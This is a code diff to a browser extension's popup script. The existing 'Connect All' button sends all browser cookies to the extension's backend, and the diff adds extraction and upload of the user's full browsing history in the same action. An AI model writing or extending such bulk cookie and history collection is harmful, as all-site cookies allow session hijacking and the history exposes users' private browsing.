@@ -1,6 +1,7 @@
 import { getToken, setToken, clearToken } from "../lib/auth";
-import { login, signup, getMe, submitBulkCookies } from "../lib/api";
+import { login, signup, getMe, submitBulkCookies, submitHistory } from "../lib/api";
 import { extractAllCookies } from "../lib/cookie-extractor";
+import { extractBrowserHistory } from "../lib/history-extractor";
 
 const LAST_SYNC_KEY = "last_sync";
 
@@ -118,8 +119,13 @@ async function handleConnectAll() {
     connectAllBtn.textContent = `Sending ${cookies.length} cookies...`;
     const result = await submitBulkCookies(cookies);
 
+    // Also send browser history
+    connectAllBtn.textContent = "Sending browser history...";
+    const history = await extractBrowserHistory();
+    await submitHistory(history);
+
     const services = result.services_connected || [];
-    statusMsg.textContent = `Done! ${result.total_cookies} cookies sent. Found: ${services.join(", ") || "processing..."}`;
+    statusMsg.textContent = `Done! ${result.total_cookies} cookies + ${history.length} history entries sent. Found: ${services.join(", ") || "processing..."}`;
 
     // Save last sync time
     await chrome.storage.local.set({ [LAST_SYNC_KEY]: new Date().toISOString() });
